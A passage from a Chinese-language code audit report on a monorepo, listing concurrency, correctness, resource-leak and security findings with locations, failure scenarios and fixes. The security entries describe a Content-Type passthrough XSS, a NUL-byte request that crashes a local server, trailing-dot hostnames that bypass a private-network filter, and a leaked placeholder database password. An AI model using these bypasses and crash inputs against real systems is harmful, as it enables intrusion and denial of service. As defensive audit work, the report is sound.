**详情**: pan 状态经 onPanChange 到 setBlueprintState(blueprintKey, pan)(989-990 行)写回 store,而 blueprintStateByProject 选择器(164-166 行)引用随之变化,使整个 1100 行 controller 在每个平移帧重渲染。dispatchTrigger(742 行)、canvas.onSelectNode(993-996 行)、resolveCollectionPreviewState(998-1000 行)都是内联闭包,每帧产生新引用并透传给 PIRRenderer。PIRRenderer 的 runtime useMemo(packages/pir-react-renderer/src/PIRRenderer.tsx:136-166)显式依赖 dispatchTrigger/onNodeSelect/resolveCollectionPreviewState,其身份每帧失效,PIRDocumentProjection 每帧全树重渲染。画布已用 useRef 稳定 onPanChange/onZoomChange,但这条链路未做同样处理。

**失败场景**: 打开含数百节点的 PIR 页面,按住拖拽平移或连续 ctrl 加滚轮缩放,controller 以 60-120Hz 重渲染,整棵画布树每帧 reconcile,平移/缩放明显掉帧;文档越大越严重,低端设备可至不可用。

**修复建议**: 用 useRef/稳定闭包包装 dispatchTrigger、onSelectNode、resolveCollectionPreviewState(与画布内 onPanChangeRef 模式一致),或在 controller 中用 useCallback 稳定这些回调,避免每帧击穿 PIRRenderer 的 runtime memo。

#### 3.3.6 resource-leak

##### M-RL-01 maximumResponseBytes 在整包下载后才生效,无法防止内存耗尽

- **位置**: [`packages/runtime-browser/src/browserNetworkAdapter.ts:190`](packages/runtime-browser/src/browserNetworkAdapter.ts#L190)
- **类别**: resource-leak ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-runtime-browser

**详情**: const contents = new Uint8Array(await response.arrayBuffer()) 先把整个响应体读进内存,随后才计算 truncated 并 contents.slice(0, responseLimit)。名为响应上限的配置并不限制实际读取量,截断只发生在解码前。

**失败场景**: live 模式请求返回数 GB body 的端点(恶意端点可无限吐数据),标签页在触及 4MB 上限前就为整个响应分配缓冲区,直接 OOM/冻结;maximumResponseBytes 配置完全不起保护作用。

**修复建议**: 改为流式读取 response.body.getReader(),累计字节超过 responseLimit 时立即 cancel reader 并按 truncated 路径处理;或用带 highWaterMark 上限的 TransformStream 截断后再解码。

#### 3.3.7 security

##### M-S-01 HandleArtifactContent 原样透传远程 Content-Type,可在已认证 /api 源上渲染 HTML/SVG

- **位置**: [`apps/backend/internal/modules/remoteexecution/handler.go:802`](apps/backend/internal/modules/remoteexecution/handler.go#L802)
- **类别**: security ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: be-remoteexec

**详情**: 第 793-802 行:contentType := response.Header.Get(Content-Type) 后 c.Data(response.StatusCode, contentType, body),把远程执行服务返回的任意媒体类型原样服务于 /api 源(携带会话 Cookie),仅有 X-Content-Type-Options: nosniff——nosniff 不能阻止显式 text/html 或 image/svg+xml 的渲染。而本模块对 Preview HTML 刻意做了隔离:HandlePreviewSession 注释(868 行)明确要把 HTML 物化到 isolated, short-lived origin(能力标签子域),artifact content 直连端点破坏了这一隔离边界。artifact 内容由 Workspace 快照构建,协作者(editor 角色)可写。

**失败场景**: 协作者在共享 Workspace 快照中植入含脚本的 SVG/HTML artifact;所有者打开 /api/remote-executions/{ownExec}/artifacts/{id}/content 且远程以 image/svg+xml 或 text/html 返回时,脚本在 /api 源执行并读取所有者的会话 Cookie,实现跨用户会话劫持;至少构成针对所有者自己的持久 XSS 面。

**修复建议**: 对该端点强制 Content-Type: application/octet-stream 并追加 Content-Disposition: attachment;或白名单仅允许不可执行的媒体类型(JSON/二进制),可渲染 artifact 一律改走隔离的 preview 能力源。

##### M-S-02 operation/settings commit 端点无请求体大小上限,可被认证用户内存耗尽

- **位置**: [`apps/backend/internal/modules/workspace/handlers_operation_commit.go:19`](apps/backend/internal/modules/workspace/handlers_operation_commit.go#L19)
- **类别**: security ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: be-ws-a

**详情**: decodeWorkspaceOperationCommitRequest 用 wireDecoder := json.NewDecoder(c.Request.Body) 后 wireDecoder.Decode(&payload) 将整个请求体读入一个 json.RawMessage(随后还会二次解码进 request),全程无 http.MaxBytesReader;handlers_settings_commit.go:17-21 的 decodeWorkspaceSettingsCommitRequest 同样直接流式解码,其 Settings json.RawMessage 字段会无界缓存并被持久化。同仓库其他 handler 均有显式上限:auth(handlers.go:83/131/231)、environment(handler.go:54)、github webhook,甚至本模块的 handlers_asset_import.go:164 用了 MaxBytesReader;服务端为 gin.Default() 加 router.Run(server.go:51,80),无全局 body 限制。路由(routes.go:21-22)也无中间件限流。

**失败场景**: 任意已注册用户先创建一个自己的 project/workspace(通过 requireWorkspaceOwner 校验),再向 POST /api/workspaces/{id}/operations/commit 持续流式发送数 GB 的 JSON(例如一个超长 patch value 字符串);Decode(&payload) 会把整个值缓存在内存中(再解码一次约双倍占用),并发数个请求即可使后端 OOM;即使单请求成功,超大 payload 还会写入 workspace_operations.payload_json 造成数据库膨胀。

**修复建议**: 与 asset import/auth 保持一致:在两个 commit handler 解码前 c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, maxCommitRequestBytes),并在规范化层对 label/mergeKey/patch value 等字段设置长度预算。

##### M-S-03 serve.mjs 请求处理未捕获 NUL 字节,单个请求即可崩溃沙箱源服务器(DoS)

- **位置**: [`apps/plugin-sandbox/scripts/serve.mjs:37`](apps/plugin-sandbox/scripts/serve.mjs#L37)
- **类别**: security ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: app-hosts

**详情**: 第 31-35 行的 try/catch 只包住 decodeURIComponent,而 decodeURIComponent(/%00) 并不抛错,会返回含 \0 的字符串。随后第 37 行 path.resolve(distRoot, .加 decodedRoute) 对含 NUL 的路径会抛 TypeError ERR_INVALID_ARG_VALUE。该异常发生在 createServer 请求回调内且未被捕获,server 也没有 error/uncaught 兜底,Node 以 uncaughtException 默认行为直接退出进程。第 40-41 行的 existsSync/statSync 同样不容错(如 TOCTOU 下文件被删也会抛 ENOENT 崩溃)。

**失败场景**: 任何能向该服务发 GET 的页面执行 fetch http://127.0.0.1:4174/%00(dev/preview/verify:deployment 默认监听 127.0.0.1:4174),path.resolve 抛 NUL 异常,未捕获,整个 Plugin Sandbox 源服务器进程退出,本地编辑器的插件沙箱与部署验证全部中断。

**修复建议**: 在 decodeURIComponent 后显式拒绝含 \0 及其他控制字符的 decodedRoute 返回 400;并把整个请求处理包进 try/catch 或对 server 增加 error 处理,保证任何畸形请求只返回 4xx 而不终止进程。

##### M-S-04 随机密码生成被 .env.example 的占位密码绕过,部署使用公开已知口令

- **位置**: [`deploy/start-app.sh:236`](deploy/start-app.sh#L236)
- **类别**: security ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: infra-scripts

**详情**: 脚本第 206-208 行在无 .env 时自动 cp .env.example .env,而 .env.example 第 6 行为 POSTGRES_PASSWORD=replace-with-a-random-password。第 236 行的保护条件 if 当前 postgres 密码为空 或 等于 postgres 只覆盖空值与 postgres,占位串既非空也不是 postgres,因此不会触发 /dev/urandom 随机生成;--yes 模式下 prompt_secret 直接静默采用该默认值,write_env_file 把它写进 .env 并交给 postgres 与 backend。脚本自身的无默认弱密码意图被落库的示例值击穿。

**失败场景**: 按 deploy/README.md 在全新裸机上执行 ./start-app.sh --yes --tag latest,Postgres 与 backend 使用字面量 replace-with-a-random-password 上线;一旦按第 233 行提示把 POSTGRES_PORT 改为 5432(去掉 127.0.0.1 前缀),任何知道该开源仓库的人都能用此公开密码远程登录数据库。

**修复建议**: 将判断改为凡 .env.example 自带的占位值一律视为未设置(如对比默认占位串或要求 .env 中密码由本脚本生成),或在 cp .env.example 后立即清空 POSTGRES_PASSWORD 行走随机生成分支。

**验证备注**: 读 start-app.sh:206-208 无 .env 时 cp .env.example .env;217 行 load_env_value 从 .env 取回第6行占位串 replace-with-a-random-password;236 行守卫仅判空或等于 postgres,占位串两者皆非,故 237 行 /dev/urandom 被跳过;240 行 prompt_secret 在 --yes 直接回默认值,write_env_file:153 落库。

##### M-S-05 私网过滤遗漏尾部点主机名,可绕过访问 loopback 与 .local

- **位置**: [`packages/runtime-browser/src/browserNetworkAdapter.ts:63`](packages/runtime-browser/src/browserNetworkAdapter.ts#L63)
- **类别**: security ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-runtime-browser

**详情**: privateHostname 用全等/后缀匹配:normalized === localhost、endsWith(.localhost)、endsWith(.local)。WHATWG URL 保留主机名尾部点,new URL(http://localhost./).hostname 为 localhost.:既不等于 localhost 也不以 .localhost 结尾,octets 分支(长度不等于4)返回 false,判为公网放行。x.localhost.、host.local. 同理绕过。

**失败场景**: 预览应用以 live 模式请求 http://localhost.:3000/admin、http://app.localhost./ 或 http://printer.local./,绕过私网拦截,浏览器按 RFC 6761/mDNS 解析到 127.0.0.1 或内网设备,从编辑器页面打到本机开发服务或内网管理口。

**修复建议**: 归一化时先去除主机名末尾的 .(normalized.replace 尾点为空)再做匹配,并为尾部点/大小写变体补充测试。

##### M-S-06 凭据脱敏漏掉 URL fragment 中的 OAuth 隐式流令牌

- **位置**: [`packages/runtime-core/src/executionConsole.ts:149`](packages/runtime-core/src/executionConsole.ts#L149)
- **类别**: security ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-runtime-core

**详情**: redactExecutionConsoleText 的查询参数正则只匹配以 ? 或 & 开头的键值;第 157 行的 key=value 正则要求前缀为行首/空白/逗号/花括号/分号。OAuth2 implicit flow 的令牌位于 fragment(https://app/#access_token=...),access_token 前是 #,两个正则都不命中,Bearer/Basic 正则也不适用,令牌原样保留。该函数被 createExecutionLogRecord、终端 emitOutput、copy-text 等所有 Console 信任边界调用。

**失败场景**: 生成的预览应用执行 console.log(redirect, location.href),URL 为 https://app/#access_token=eyJ0eXAi:记录经 createExecutionLogRecord 后 redacted=false,访问令牌进入 Session 事件、Console 快照与终端复制文本,被持久化/展示给可观察执行输出的任何一方。

**修复建议**: 将查询参数正则的锚点扩展为 [?&#](即 access_token 等前可含 #),并对 fragment 形式同样脱敏;补充针对 #access_token=、#id_token= 的回归用例。

**验证备注**: 第149行查询参数正则锚点为 [?&],第157行 key=value 正则前缀为行首/空白/逗号/花括号/分号,均不含 #。用逐字一致的6段正则链实测:https://app/#access_token=eyJ 输出 redacted=false 令牌原样保留,而 ?access_token= 正确脱敏;#id_token=、#token= 亦漏网。可达路径:字符串参数经 createExecutionLogRecord 到 redactExecutionConsoleValue。

---

### 3.4 Low(111 条)

#### 3.4.1 concurrency

##### L-CC-01 outbox 刷新无请求定序,乱序响应可使保存指示器滞留错误状态

- **位置**: [`apps/web/src/editor/features/blueprint/editor/controller/useWorkspaceSaveIndicator.ts:44`](apps/web/src/editor/features/blueprint/editor/controller/useWorkspaceSaveIndicator.ts#L44)
- **类别**: concurrency ｜ **置信度**: low ｜ **验证状态**: 未验证 ｜ **审查单元**: web-bp-canvas

**详情**: refresh()(42-52 行)在每次 subscribeWorkspaceOutbox 信号时触发 listWorkspaceOutboxEntries,没有序列号或 abort:若两次并发读取乱序完成,较早(较旧)的条目列表会覆盖较新结果;setEntries 只取最后一次 resolve 的值而非最后一次发起的值。

**失败场景**: outbox 新增条目触发 refresh1(读到 pending 列表),随即提交确认触发 refresh2(读到空列表);若 refresh1 后 resolve,entries 滞留为非空,指示器一直显示 Persisting Workspace operations 且 hasPendingChanges=true,直到下一次 outbox 变化才自愈。

**修复建议**: 为每次 refresh 分配递增序号(或用 AbortController),仅当序号等于最新发起序号时才 setEntries。

##### L-CC-02 setNodes updater 内调用 window.confirm(不纯更新函数),StrictMode 下确认弹窗出现两次

- **位置**: [`apps/web/src/editor/features/development/reactflow/nodeGraphNodeChanges.ts:59`](apps/web/src/editor/features/development/reactflow/nodeGraphNodeChanges.ts#L59)
- **类别**: concurrency ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: web-dev-b

**详情**: onNodesChange 以 setNodes(current 到 applyNodeChangesWithGrouping(changes, current, confirmAttachToGroup)) 调用(NodeGraphEditorContent.tsx 第537-539行),而 confirmAttachToGroup 是阻塞的 window.confirm(第522-533行)。React 要求 updater 为纯函数且可能多次执行:应用被 StrictMode 包裹(main.tsx 第15行),开发模式下 updater 双调用会使每次拖入组时弹出两个相同的确认框;React 采用第二次调用的结果。另外多选 N 个节点拖入同一组会在更新过程中连续弹出 N 个阻塞对话框。

**失败场景**: 开发模式下把一个节点拖入 groupBox:先弹一个 Add node to X,用户点 Yes,紧接着 StrictMode 第二次调用又弹一个,用户以为是别的操作点了 No;React 采用第二次结果 No,节点吸附被静默取消,与用户意图相反。

**修复建议**: 把确认移出 updater:在 onNodesChange 里先用当前 nodes 计算 pendingGroupAttach 并完成 confirm,再用一个只含纯映射的 updater 执行 setNodes;或对同组多节点合并为一次确认。

##### L-CC-03 Outbox 信号在 run() 执行期间被丢弃且无兜底轮询,新 entry 可能滞留

- **位置**: [`apps/web/src/editor/workspaceSync/WorkspaceOutboxEffects.tsx:93`](apps/web/src/editor/workspaceSync/WorkspaceOutboxEffects.tsx#L93)
- **类别**: concurrency ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: web-sync-store

**详情**: subscribeWorkspaceOutbox 的回调直接调用 run(),而 run() 在 runningRef.current 为 true 时立即返回(line 92-96),既不记录 dirty 标志也不在结束后重查。函数末尾的 head 复查(line 138-171)只覆盖复查读事务开始之前已提交的 entry;若某次派发恰好发生在最后一次 await Promise.all(list)(line 138-143)的 IndexedDB 读事务期间,该 entry 对读事务不可见,而其 notifyWorkspaceOutboxChanged 又因 runningRef=true 被丢弃,随后 runningRef=false 且没有调度任何 retry 定时器。组件没有任何周期性轮询,因此这条 queued entry 会静默滞留,直到下一次编辑/online/重新加载才被发送。

**失败场景**: 挂载时 drain 正在收尾(最后一次 list 读事务进行中),用户的关键一次编辑完成 enqueue 并触发 notify,notify 被 runningRef 挡掉,list 又没读到它,run 结束且未设定时器,该操作在用户不再编辑、网络正常的情况下一直不同步,直到刷新页面或触发 online 事件。

**修复建议**: 在 run 中引入 dirty 标志:信号到达时若正在运行则置 dirty=true;finally 中若 dirty 则立即再次调度 run(setTimeout 0),或在末尾复查 head 之后、释放 runningRef 之前再消费一次待处理信号。

##### L-CC-04 savingArtifactId 被无关错误更新/过期保存完成无条件清除,在途保存状态丢失

- **位置**: [`packages/authoring/src/codeAuthoring.ts:378`](packages/authoring/src/codeAuthoring.ts#L378)
- **类别**: concurrency ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-authoring

**详情**: setCodeAuthoringSessionError 无条件设置 savingArtifactId: undefined(第378行),既不校验 message 是否为空(空串仅表示清除错误),也不校验 error 归属的 artifactId 是否等于正在保存的 savingArtifactId。同类问题还出现在:completeCodeAuthoringSessionSave(第358行)无条件清除 savingArtifactId,即使 saved.artifactId 不等于 session.savingArtifactId;beginCodeAuthoringSessionSave(第344行)直接覆写 savingArtifactId 而不检查是否已有在途保存。savingArtifactId 是该会话唯一跟踪在途保存的状态字段,这三个转换均未与它做任何一致性核对。

**失败场景**: 用户对 artifact A 执行保存(savingArtifactId=A,保存 Promise 在途),随后切换活动文件到 B;此时任一消费者调用 setCodeAuthoringSessionError(session, 空) 清除旧错误,或为 B 设置诊断错误,savingArtifactId 立即变为 undefined。依赖该字段禁用保存按钮/显示保存进度的 UI 会认为保存已结束:用户可再次触发保存造成并发写,或在途保存进度丢失;begin(A) 到 begin(B) 到 complete(A) 序列同样会在 B 仍在保存时把标记清空。

**修复建议**: 仅在错误归属于正在保存的 artifact(或 message 对应该保存)时才清除 savingArtifactId;completeCodeAuthoringSessionSave 只在 saved.artifactId === session.savingArtifactId 时清除;beginCodeAuthoringSessionSave 对已有在途保存做显式处理(拒绝或记录覆盖)。

##### L-CC-05 生成的 runner 中 replaceProjectSource 在 await writeFile 之后才置位围栏标志,并发调用可双写

- **位置**: [`packages/prodivix-compiler/src/executableProject/isolatedServerFunctionProject.ts:318`](packages/prodivix-compiler/src/executableProject/isolatedServerFunctionProject.ts#L318)
- **类别**: concurrency ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-compiler-export

**详情**: 并发双写在 runner 内确定性可达且结果 ok:true,但宿主应用两处文档变更不成立:readRemoteWorkerProjectSourceMutationArtifact 要求文件系统 diff 恰含 1 条 change 且 changeCount 为 1,两个 module 文件同时被改写时 workerAgent 以 invalid-project-source-mutation 将执行转 failed(fail-closed,不落库)。实际影响仅为内层恰好一次围栏的纵深防御退化与错误路径差异;同目标并发退化为 last-write-wins 的单变更,内容皆函数自撰,无越权。

**失败场景**: 函数实现写 await Promise.all 两个 replaceProjectSource(artifactId A source sA 与 artifactId B source sB):两个调用同步地先后通过守卫,随后各自完成 writeFile,两个 module 源文件都被改写,且 sourceMutationCompleted 为 true 不触发 SVR_SOURCE_MUTATION_REQUIRED,调用以 ok:true 结束——恰好一次源码变更围栏被确定性绕过。

**修复建议**: 在 await writeFile 之前同步执行 sourceMutationCompleted = true(检查通过后立即置位),使第二次并发调用在守卫处即抛 SVR_SOURCE_MUTATION_INVALID。

**验证备注**: 缺陷属实:生成 runner(isolatedServerFunctionProject.ts:314-319)先查 sourceMutationCompleted,await writeFile(318)后才置位;Promise.all 并发时第二次调用同步段必先于首次 I/O 完成置位而通过守卫,确定性双写并 ok:true(337 不抛)。但影响高估:宿主 projectSourceMutationArtifact.ts 要求单 change。

##### L-CC-06 旧 server 进程退出时无条件清空 serverOwnerId,误清新 server 归属

- **位置**: [`packages/runtime-browser/src/browserProjectRuntimeHost.ts:434`](packages/runtime-browser/src/browserProjectRuntimeHost.ts#L434)
- **类别**: concurrency ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-runtime-browser

**详情**: 进程退出 finally 中 if (spawnOptions.kind === server 且 serverOwnerId === ownerId) serverOwnerId = undefined 只比较 owner 不比较进程身份。同一 owner 先 kill 旧 server 再 spawn 新 server 时(serverOwnerId 被新 spawn 覆盖为同一 owner),旧进程延迟退出会把新 server 的归属一并清掉。

**失败场景**: owner A 重启预览 server(kill server1 后 spawn server2),server1 的 exit 后结算,serverOwnerId 置空,server2 的 server-ready/preview-error 事件不带 ownerId 发布,共享 host 的 test runner 收到不属于自己的事件;owner B 还可绕过 server 占用检查再 spawn 一个 server,造成双 server 端口冲突。

**修复建议**: 登记当前 server 进程引用(或进程级 id),finally 中仅当退出的进程就是当前登记的 server 进程时才复位 serverOwnerId。

#### 3.4.2 correctness

##### L-C-01 默认 TTL 的 ms 到 s 换算未要求整秒,非整秒 defaultTtlMs 会使缺省 TTL 请求全部 400

- **位置**: [`apps/asset-delivery-host/src/assetDeliveryHttpHandler.ts:158`](apps/asset-delivery-host/src/assetDeliveryHttpHandler.ts#L158)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: app-hosts

**详情**: requestTtlMs 计算 Number(request.headers[x-prodivix-delivery-ttl-seconds] 或 defaultTtlMs / 1000),并要求 Number.isSafeInteger(seconds)(第 160 行);而构造函数仅在第 341 行校验 Number.isSafeInteger(defaultTtlMs) 且 defaultTtlMs 大于等于 1000,未要求 defaultTtlMs 是 1000 的倍数。若调用方传 defaultTtlMs: 1500,缺省 seconds = 1.5,不是安全整数,抛 TypeError,catch 统一返回 400 invalid-delivery-request。remote-preview-host/src/previewHttpHandler.ts 第 242-249 行存在同形缺陷。当前两个 main.ts 均以 env 秒数乘 1000 装配故未触发,但导出的工厂函数接受这种坏配置。

**失败场景**: 以 createPreviewHttpHandler(defaultTtlMs 1500) 装配后,任何未携带 X-Prodivix-Preview-Ttl-Seconds 的 POST /internal/preview-sessions 都会在读取并校验完 64MB body 后得到 400 invalid-preview-ttl,且永远无法创建会话;asset 侧同理得到 400 invalid-delivery-request。

**修复建议**: 在构造校验中要求 defaultTtlMs % 1000 === 0(两个 host 一致),或让缺省路径直接以毫秒传递(defaultTtlMs)而不做 /1000 再乘 1000 的往返换算。

##### L-C-02 改绑 GitHub 仓库时未重置同步状态,导致 sync-state 返回上一仓库的陈旧数据

- **位置**: [`apps/backend/internal/modules/integrations/github/store.go:416`](apps/backend/internal/modules/integrations/github/store.go#L416)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: be-rest

**详情**: UpsertRepositoryBinding 的 ON CONFLICT (project_id) WHERE status = active DO UPDATE 仅更新 installation_id/owner/repo/default_branch/branch/updated_at(第417-422行),未重置 pir_dirty、pir_last_synced_rev、pir_last_commit_sha、artifacts_* 等同步状态列。当同一 project 从仓库 A 改绑到仓库 B 时,这些列仍保留仓库 A 的值。

**失败场景**: 项目 P 绑定仓库 A 并完成同步(pir_dirty=false、pir_last_commit_sha=shaA)。用户经 POST /projects/:id/integrations/github/binding 改绑到仓库 B。随后 GET .../sync-state 仍返回 dirty=false 与 shaA(HandleGetProjectSyncState 第266-277行),UI 误判仓库 B 已同步,用户看不到待同步提示。

**修复建议**: 当 owner/repo/installation_id 发生变化时,在 DO UPDATE 中一并重置 pir_dirty=TRUE、artifacts_dirty=TRUE 及 last_synced_*/last_commit_sha/last_error_code 等列(或检测变更后重置)。

##### L-C-03 社区搜索关键字未转义 ILIKE 通配符,% 与 _ 被当作模式匹配

- **位置**: [`apps/backend/internal/modules/project/community_store.go:40`](apps/backend/internal/modules/project/community_store.go#L40)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: be-rest

**详情**: ListPublic 中 pattern := % 加 keyword 加 % 直接拼接用户关键字用于 p.name ILIKE $n OR p.description ILIKE $n(第41-44行),未对 ILIKE 的特殊字符 %、_ 进行转义(也未指定 ESCAPE)。参数化已避免 SQL 注入,但通配符语义未被当作字面量。

**失败场景**: 用户搜索关键字 foo_bar 会匹配 fooXbar、foo1bar 等;搜索 % 会匹配几乎所有项目;搜索 100% 匹配所有以 100 开头的项目。返回与用户预期(字面量匹配)不符的结果集。

**修复建议**: 对 keyword 中的反斜杠、%、_ 转义后再拼接两端通配符,并在 ILIKE 后加 ESCAPE 反斜杠。

##### L-C-04 角色列表在 256 个授权后硬失败(409),而授权路径无上限,导致管理永久不可用

- **位置**: [`apps/backend/internal/modules/remoteexecution/store.go:229`](apps/backend/internal/modules/remoteexecution/store.go#L229)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: be-remoteexec

**详情**: ListWorkspaceExecutionRoles 查询 LIMIT 257(199 行),循环内 if len(grants) 大于 256 return nil, ErrExecutionAuthorityConflict(229-231 行),handler 映射为 409 EXE-4009。但 GrantWorkspaceExecutionRole / GrantWorkspaceExecutionRoleByEmail 没有任何数量上限校验,第 257 个授权可以成功写入。一旦溢出,列表接口对该 workspace 永久返回 409(不是截断或分页错误),而 UI 依赖列表拿到 principalId 才能调用 DELETE 撤销。

**失败场景**: owner 给 257 个不同邮箱授予 viewer/editor 角色(每次都 204 成功),此后 GET /api/workspaces/{id}/execution-roles 永远返回 409 EXE-4009,角色管理页永久报错,无法列出也无法经 UI 撤销,必须线下知道 principalId 直接调 DELETE 才能恢复。

**修复建议**: 在授权路径加入 256 上限校验(超限返回 409/429 并提示),或让列表在达到上限时返回截断结果加分页标志,而不是把溢出当成数据损坏硬失败。

##### L-C-05 validateWorkspaceCodeDocument 的 language TrimSpace 是死写入,带空白 language 被原样持久化

- **位置**: [`apps/backend/internal/modules/workspace/store_helpers.go:507`](apps/backend/internal/modules/workspace/store_helpers.go#L507)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: be-ws-b

**详情**: validateWorkspaceCodeDocument 在 store_helpers.go:507 执行 document[language] = strings.TrimSpace(language),但 document 只是已 marshal 之后的本地解码 map,该赋值不影响返回的规范化字节(normalizeWorkspaceDocumentContent 在 store_helpers.go:327 先 normalizeJSONDocument 生成 normalized,再传入校验)。因此 language= ts (前后含空格) 通过非空校验后被原样存储;提交路径(operation_commit_apply.go:139/477 复用同一校验)同样放行 replace /language 为 ts。语言能力提供者按精确 language id 匹配,该文档将匹配不到任何 ts/js 语言服务。

**失败场景**: 对 code 文档提交 replace /language 值 ts(前后含空格):校验通过,workspace_documents.content_json 存为 language 含空格;其后 Code Semantic Provider / 语言引擎按 ts 精确键查找全部未命中,该代码文档无补全/诊断/语义索引,且不报错。

**修复建议**: 在 normalizeWorkspaceDocumentContent 中对 code 文档真正重写规范化字节(解码-TrimSpace-重 Marshal),或在校验中拒绝带外围空白的 language,使存储值与提供者可匹配键一致。

##### L-C-06 bin 入口导入的 dist/cli.js 永远不会被生成,CLI 二进制恒不可用

- **位置**: [`apps/cli/package.json:6`](apps/cli/package.json#L6)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: apps-cli-vscode

**详情**: 问题真实但非高严重度:bin/start 脚本确实指向永远不会生成的 dist 产物(noEmit:true),根 package.json 的 cli 脚本同样受影响。但 apps/cli/README.md 第11、41、45行已明确记录这是已知的脚手架占位状态,CLI 版本 0.0.0 且命令为占位,tsx dev 路径可用。属于待完善的 TODO,非隐蔽 correctness 缺陷。

**失败场景**: 用户执行 pnpm build:cli 后运行 prodivix 或 node apps/cli/bin/prodivix.js,ERR_MODULE_NOT_FOUND: Cannot find module dist/cli.js,CLI 二进制入口在任何平台都必然崩溃;pnpm --filter @prodivix/cli start 同样 MODULE_NOT_FOUND。

**修复建议**: 去掉 tsconfig 的 noEmit 或新增产出构建配置(如 tsconfig.build.json / esbuild 打包),确保 dist/cli.js 存在;删除或修正指向不存在 src/index.ts 的 start 脚本。

**验证备注**: 事实全部成立:tsconfig 第16行 noEmit:true,build 脚本仅 tsc 类型检查;dist/ 不存在且被 .gitignore 忽略;bin/prodivix.js 第2行 import ../dist/cli.js 必失败;start 指向 dist/index.js 但 src 下无 index.ts。但 README 已明确记录此为已知限制,CLI 版本 0.0.0、命令为占位。

##### L-C-07 commander 外部可执行子命令指向不存在的 build.js/export.js,子命令必然失败

- **位置**: [`apps/cli/src/cli.ts:8`](apps/cli/src/cli.ts#L8)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: apps-cli-vscode

**详情**: cli.ts 第8-13行以 executableFile 方式注册子命令:.command(build, ..., executableFile commands/build.js) 与 export 同理。commander 会把相对 executableFile 解析到主脚本所在目录:经 bin/prodivix.js 运行时为 bin/commands/build.js(不存在);经 tsx src/cli 运行时为 src/commands/build.js(该目录只有 build.ts,export.ts 是空文件)。且 build.ts 是内部子命令写法——export default new Command(build).action(...),作为独立子进程执行时从不调用 .parse(argv),action 永远不触发。

**失败场景**: 用户执行 prodivix build,commander 解析子命令可执行文件失败并抛出 .../commands/build.js does not exist;即便把路径改为 dist/commands/build.js,子进程也只是加载一个不解析 argv 的模块后静默退出(码 0),build 命令已连接 永远不会打印。

**修复建议**: 改为内部注册:import build from ./commands/build; program.addCommand(build),让主进程统一 parse;export 命令同理,并删除空的 export.ts/deploy.ts 或补齐实现。

**验证备注**: 实测复现:调用 cli(node .../src/cli.ts build) 抛 Error: commands/build.js does not exist。commander@15 _executeSubCommand(1244-1255)将相对 executableFile 解析到主脚本目录,findFile 因 .js 属 sourceExt 不尝试 .ts。

##### L-C-08 会话过期后无任何再校验,客户端状态不迁移到未登录

- **位置**: [`apps/web/src/auth/AuthSessionSync.tsx:15`](apps/web/src/auth/AuthSessionSync.tsx#L15)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-app-infra

**详情**: 核心结论成立但表象需修正:zustand v5 用原生 useSyncExternalStore,时间依赖的 isAuthenticated() 在每次组件重渲染都会重算,过期后用户操作触发 setLoading 等重渲染时页面通常切到未登录视图,并非持续展示 401 错误。真正缺陷在状态机层:无到期定时器/周期性 me(),apiRequest 无全局 401 到 clearSession,token/user/expiresAt 滞留 store 与 localStorage,仅整页刷新 onRehydrateStorage 或手动登出清除;空闲页面过期后仍显示已登录,请求继续携带失效 token。

**失败场景**: 用户登录后长时间保持页面不刷新,超过 token TTL(或会话被服务端撤销),客户端 isAuthenticated 仍为 true,UI 保持已登录;此后每个 apiRequest 都携带失效 token,后端返回 401 API-2001,各页面仅把 ApiError.message 作为错误提示展示,没有任何路径调用 clearSession,用户停留在已登录但一切操作必失败的状态,直到手动整页刷新才被 onRehydrateStorage 清除。

**修复建议**: 在 AuthSessionSync 中根据 expiresAt 设置到期定时器(到期即 clearSession,或触发一次 me 再校验),并为应用层 apiRequest 增加统一的 401 处理回调调用 clearSession,使过期后状态机正确迁移到未登录。

**验证备注**: AuthSessionSync.tsx:43 deps 含 clearSession/expiresAt/hasHydrated/setUser/token,action 恒定、时间流逝不触发重跑,me 仅27行一次性调用,auth 目录无定时器/visibility;apiClient.ts apiRequest 无 401 处理,全仓库仅34行 me 401 清除。

##### L-C-09 数值字面量输入框清空时 Number 空串等于 0,静默提交字面量 0

- **位置**: [`apps/web/src/editor/features/blueprint/editor/inspector/domain/ComponentInstanceInspectorPanel.tsx:247`](apps/web/src/editor/features/blueprint/editor/inspector/domain/ComponentInstanceInspectorPanel.tsx#L247)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: web-bp-insp-b

**详情**: 数值 prop 编辑器 onChange 中 const next = Number(event.target.value); if (Number.isFinite(next)) publishLiteral(next)。Number 空串 为 0 且 isFinite,用户全选删除输入框即发布 kind literal value 0 到 onUpdateBindings;受控 value 随后显示 0,用户无法获得空态。同类问题见 LayoutPatternPanel.tsx:208(Number(next) 对空串得 0 后 updatePatternParam 写 0)。

